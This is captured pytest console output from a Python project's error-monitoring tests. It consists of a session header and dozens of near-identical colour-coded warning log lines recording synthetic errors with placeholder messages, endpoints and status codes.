============================= test session starts ==============================
platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /home/paul/boardroom-repo/.venv/bin/python
cachedir: .pytest_cache
rootdir: /home/paul/boardroom-repo
configfile: pyproject.toml
plugins: mock-3.14.0, langsmith-0.3.21, cov-6.2.1, Faker-37.4.0, xdist-3.8.0, anyio-4.9.0, asyncio-1.0.0, env-1.1.5
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792683Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1975'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792730Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1976'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792778Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1977'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792826Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1978'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792873Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1979'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792921Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1980'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.792969Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1981'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793017Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1982'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1983'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1984'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793159Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1985'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793207Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1986'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793254Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1987'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793303Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1988'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793351Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1989'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1990'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1991'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793577Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1992'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793628Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1993'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793683Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1994'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793734Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1995'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793789Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1996'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1997'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793898Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1998'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.793950Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m40[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1999'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794002Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2000'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794052Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2001'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794102Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2002'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794152Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2003'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794202Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2004'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794317Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2005'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794393Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2006'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2007'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794503Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2008'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794554Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2009'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794603Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2010'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
